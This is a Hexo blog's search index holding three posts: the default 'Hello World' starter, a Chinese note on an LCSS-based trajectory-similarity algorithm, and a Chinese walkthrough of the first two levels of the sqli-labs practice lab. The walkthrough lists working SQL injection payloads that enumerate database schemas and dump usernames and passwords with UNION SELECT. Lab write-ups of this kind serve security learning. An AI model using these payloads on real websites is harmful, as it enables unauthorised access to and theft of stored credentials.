<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/03/14/hello-world/"/>
    <url>/2022/03/14/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>my first blog</title>
    <link href="/2022/03/09/my%20first%20blog/"/>
    <url>/2022/03/09/my%20first%20blog/</url>
    
    <content type="html"><![CDATA[<p>核心算法的具体实现:<br>分析：在本系统中，由于轨迹点的绝对位置是要参与比较的，因此，针对针对每条轨迹的归一化是不需要的。<br>步骤：<br>1.首先针对两个点，计算其转化距离，这里用空间位置上的欧几里得距离来代表，而对于带有时间的轨迹点求转化距离还需要带有时间跨度的计算，最后设置欧几里得距离和时间跨度的权值来获得两个点的转化距离<br>步骤1<br>2.对于两条轨迹的比较，这里采用LCSS算法来求得两条轨迹的编辑距离，其中两条轨迹的长度是可以不同的，即所包含的轨迹点是不需要相同，而其中元素的转化惩罚值即为轨迹点的转化距离<br>步骤2<br>3.最后，对于获得的两条轨迹的编辑距离，这里采用指数函数的方法，将最终的相似度作为编辑距离的底小于1的指数函数，满足当编辑距离为1时，相似度为1，即100%,而当编辑距离增大时,相似度减小，且减小的趋势越来越不明显，并且最终趋近于0，恰好符合相似度求解的要求。</p>]]></content>
    
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-libs</title>
    <link href="/2021/06/10/sqli-libs/"/>
    <url>/2021/06/10/sqli-libs/</url>
    
    <content type="html"><![CDATA[<p>第一关<br>?id&#x3D;1 (回显正常)<br>?id&#x3D;1’回显错误) 可以判断出是基于单引号注入然后and判断一下<br>?id&#x3D;1’and 1&#x3D;1 (回显正常)<br>?id&#x3D;1’and 1&#x3D;2 回显错误证明存在注入漏洞<br>则or 相反<br>?id&#x3D;1’or 1&#x3D;2 –+ （回显正常）<br>?id&#x3D;1’or 1&#x3D;1 –+ （回显错误，证明存在注入漏洞）<br>然后判断列数<br>?id&#x3D;1’ order by 3 –+（没报错）<br>?id&#x3D;1’ order by 4 –+ （报错）<br>联合查询一下<br>?id&#x3D;1’and 1&#x3D;2 union select 1,2,3 –+<br>基于上述的简单联合查询<br>进行爆表<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(schema_name),3 from information_schema.schemata –+<br>基于上述进行爆表进行爆security库内的表<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;”security” –+<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;”users” –+<br>爆字段里面的数据<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(username,0x5c,password),3 from  users –+   </p><p>第二关<br>1.判断注入类型：<br>?id&#x3D;1 正常<br>?id&#x3D;1’异常<br>?id&#x3D;1’–+ 异常<br>由此判断为整型注入<br>2.判断字段数：<br>?id&#x3D;1 order by 3 正常<br>?id&#x3D;1 order by 4 异常<br>判断字段数为3<br>3.爆数据库名<br>?id&#x3D;-1 union select 1,database(),3<br>可以查询到数据库名为security<br>4.爆表名<br>?id&#x3D;-1 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;’security’),3<br>由此获得security的四个表，emails，referers,uagents,users<br>5.爆字段名<br>?id&#x3D;-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’and table_name&#x3D;’users’),3<br>获得表users的三个字段名，id，username，password<br>6.取数据<br>?id&#x3D;-1 union select 1,(select group_concat(id,username,password)from users),3</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
